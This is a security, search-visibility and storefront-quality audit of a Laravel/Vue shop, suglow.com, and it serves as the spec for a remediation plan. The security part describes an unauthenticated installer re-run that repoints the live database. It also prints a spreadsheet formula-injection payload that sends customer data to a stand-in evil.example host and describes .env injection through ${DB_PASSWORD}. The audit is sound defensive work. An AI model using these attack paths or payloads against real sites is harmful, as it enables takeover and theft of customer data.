# suglow.com audit — security, search visibility (SEO/AEO/GEO), storefront quality

Date: 2026-10-02. Scope: the Laravel 12 + Vue 3 codebase in this repository and
the live site at https://suglow.com (read-only requests only). Baseline: 361
PHPUnit tests passing. Earlier reviews (SECURITY-FINDINGS.md, 10 Aug; the
SECURITY release, 21 Sep; SEO-META / SPEED-SEO-ADS, 25-26 Sep) were re-checked
rather than repeated; their fixes still hold.

This document is the spec for
`docs/superpowers/plans/2026-10-02-security-seo-storefront.md`.

---

## Part A — Security

### A1. CRITICAL — the installer can be re-run on the live site, unauthenticated

`routes/web.php` registers `/install/*` with only the `web` middleware. The
"already installed" guard is in `InstallerController::__construct()`:

```php
if (file_exists(storage_path('installed'))) {
    Redirect::to(env('APP_URL'))->send();
}
```

`send()` (Symfony 7.4.19) flushes the redirect, calls
`litespeed_finish_request()`, and **returns** — PHP keeps executing, and the
controller action runs after the visitor has already received the redirect.
Live evidence: `GET https://suglow.com/install` answers 302 carrying
`x-powered-by: PHP/8.4.24` and none of the app's security headers, i.e. the
response was emitted from inside the constructor, outside the middleware
pipeline.

Impact, per action (CSRF is no barrier: any storefront page hands out a session
and an `XSRF-TOKEN` cookie):

- `POST /install/database` with the attacker's own MySQL host: the production
  `.env` DB credentials are rewritten to point at it, `config:cache` runs, then
  `migrate:fresh --force` + `db:seed`. The live shop then reads and writes the
  attacker's database: admin accounts, prices, every new order and customer.
- `POST /install/site`: rewrites `APP_NAME` / `APP_URL` in `.env`.
- `GET /install/final-store` (no CSRF at all): `storage:link --force` and
  `optimize:clear` for anyone who requests it.
- `GET /install/requirement`, `/permission`: server fingerprinting.

Fix: a middleware that 404s the whole installer group once `storage/installed`
exists (it runs before the controller is built), and the constructor's
`send()` replaced with `abort(404)`.

### A2. MEDIUM — spreadsheet formula injection in staff exports

PhpSpreadsheet's default value binder stores any string starting with `=` as a
live formula. Customer-typed text (guest-checkout name, addresses, reviews)
reaches 22 admin exports (orders, customers, reviews, ...). A guest order named
`=HYPERLINK("https://evil.example/?"&C2&D2,"View")` becomes a working link that
ships neighbouring customers' phone numbers off-site when staff click it.

Fix: a value binder that writes strings beginning with `=` as plain text,
installed as the default for every export.

### A3. MEDIUM-LOW — settings that write `.env` can break or extend it

Company name (`APP_NAME`), mail settings (`MAIL_*`) and the licence key
(`VITE_API_KEY`) are written to `.env` by `dipokhalder/laravel-env-editor`,
which wraps values containing spaces in quotes but never escapes them. An honest
company name such as `Suglow "BD"` produces an unparseable `.env` and the whole
site returns 500 (the same failure as the 25 Sep pixel-snippet incident). A
crafted value can append extra lines (`APP_DEBUG=true`) or pull secrets into a
visible setting with `${DB_PASSWORD}`. Staff-only (`settings` permission).

Fix: a validation rule on those fields refusing `"`, `\`, line breaks, NUL and
`${`, plus an env writer that enforces the same rule for every caller.

### A4. LOW — class names built from URL/body input; crashing public routes

- `PaymentManagerService::gateway()` instantiates
  `App\Http\PaymentGateways\Gateways\` + any request string. The namespace
  prefix confines it to existing gateway classes, but unknown names are 500s.
- `GET /api/checkout/{order}/{gateway}/payment|success|fail|cancel` pass the raw
  URL string as the order (no model binding) to that factory. Nothing in the
  storefront calls them; they cannot work and only widen the surface.
- `GET /api/frontend/language/{code}` and `GET /api/frontend/overview` route to
  controller methods that do not exist: every hit is a 500 with a full stack
  trace written to `laravel.log`, unauthenticated and unthrottled — a free
  log-flooding vector. (Live: both answer 500.)

Fix: allow-list gateway classes (must exist and extend `PaymentAbstract`);
delete the four checkout routes and the two broken routes.

### A5. LOW — no Permissions-Policy

The storefront never uses camera, microphone or geolocation. Fix: send
`Permissions-Policy: camera=(), microphone=(), geolocation=()`.

### Checked and clean (no change)

Admin API gating (`staff` + per-method permissions + coverage test), CORS (own
origin only), session cookie (`secure; httponly; samesite=lax`), security
headers, OTP generation (`random_int`, attempt limits), customer ownership on
orders / addresses / returns / reviews, payment verification (bKash amount +
invoice + trxID reuse, SSLCommerz validation API), upload types (raster/PDF
only, no SVG), storefront `v-html` (admin-authored content only), `.env`,
directory listings and debugbar not exposed on the live site.

### Needs the owner (cannot be fixed in code)

- Server `.env`: `SANCTUM_TOKEN_EXPIRATION` is still unset (tokens never
  expire) — decide when to set it (it signs everyone out once).
- Review who holds the `settings` permission.
- Delete the published test blog content (`/blog/test`, `/blog/category/test`).
- Product descriptions hotlink images from `static-01.daraz.com.bd`; they can
  vanish or be blocked at any time and become the product page's largest
  paint on desktop. Re-upload them to Suglow.

---

## Part B — Search visibility (Google, Bing, AI answer engines)

Already strong and kept: server-rendered titles/descriptions/canonicals for
product, category, brand, blog, listing, offers, most-popular and login pages;
Product/Offer (shipping + returns) + BreadcrumbList + Organization/OnlineStore +
2 Store + WebSite/SearchAction + FAQPage JSON-LD; `<noscript>` facts for
non-JS crawlers; sitemap (1,208 URLs); robots.txt welcoming AI crawlers;
llms.txt; hourly Google/Meta product feed.

Gaps found:

| # | Finding (live evidence) | Fix |
|---|---|---|
| B1 | Unknown URLs (`/this-page-does-not-exist`, `/composer.json`) answer **200 + `index` + self-canonical**: soft 404s. Dead product/category/brand links answer Laravel's bare "Not Found" page — no header, search or navigation. | Unknown paths and missing records answer **404 with the storefront shell** + `noindex` (the SPA shows its Not Found page with full navigation). Obvious file probes (`.php`, `.env`, ...) get the cheap plain 404. |
| B2 | Private SPA pages (`/checkout/*`, `/account/*`, `/signup`, `/wishlist`, ...) are served `index, follow`. | Serve them `noindex, follow`. |
| B3 | The SPA rewrites `/` to **`/home`**, so the address bar and every shared link is a duplicate homepage URL with a generic title and self-canonical. | Home lives at `/`; `/home` 301s to `/` (server) and redirects to `/` (SPA). |
| B4 | `/page/about-us`, `/page/legal`, `/page/support` (trust pages AI engines quote) and `/flash-sale`, `/promotion/*`, `/product-section/*`, `/campaign/*` get the generic site title and description. | Server-rendered title/description/canonical, AboutPage/ContactPage/WebPage JSON-LD and `<noscript>` body for CMS pages; titles for the promo pages; 404 when the record is missing or inactive. |
| B5 | Organization JSON-LD has no `sameAs`, though Facebook and YouTube are configured. FAQ says "over 440 products"; sitemap and llms.txt say 1,100+. `product:brand` prints the placeholder "No Brand". A hard-coded `googlebot` meta says `index` even on `noindex` pages. | `sameAs` from the social settings; product count computed from the catalogue; placeholder brand omitted; googlebot meta removed (robots meta covers it); llms.txt links the company/policy pages. |
| B6 | Sitemap omits `/most-popular` and has no image entries. | Add it; add `image:image` for every product photo. |
| B7 | Bing (which feeds ChatGPT Search, Copilot, DuckDuckGo, Yahoo) and Yandex/Seznam/Naver learn about new or changed products only on their next crawl. | IndexNow: key file + hourly submission of changed URLs (scheduler + ScheduleFallback). |

---

## Part C — Storefront quality (measured in Chrome against the live site)

| # | Finding | Fix |
|---|---|---|
| C1 | **Layout shift.** The header switches from in-flow to `fixed` at `scrollY > 0`, so the page jumps by the header height on every scroll to/from the top: 0.13 CLS per page on mobile, 0.076 on desktop. On desktop first load the footer renders near the top while sections wait for data and is then pushed down: 0.42 CLS within 1 s. Google rates > 0.25 "poor". | `position: sticky` header (no class toggle, no scroll listener); `<main>` with `sm:min-h-screen` so the desktop footer starts below the fold. |
| C2 | **Hero banners cropped on phones.** Slides are 1689×600 (conversion and admin guidance) but shown in a 4:3 box with `object-cover`: phones see ~47% of each banner's width — the offer text is cut off. The hero also has no reserved space while its data loads (category row jumps ~130 px). | Show slides at their real 1689:600 ratio everywhere; reserve that box (skeleton) while loading. |
| C3 | Icon-only buttons with no accessible name (header search ×2, account, desktop cart, mobile cart, listing filter); product zoom image and CMS page image lack real `alt`. | `aria-label` from existing translation keys; `alt` from the product/page name. |
| C4 | CMS pages never set their own document title in the SPA. | `useHead` on the page component. |

Out of scope (noted, not changed): banner/product content (names like
"… | first time in bangladesh | made in thailand", products without photos),
Meta's own `capig.stape.id` / SmartSetup console errors (Meta-side), full SSR.
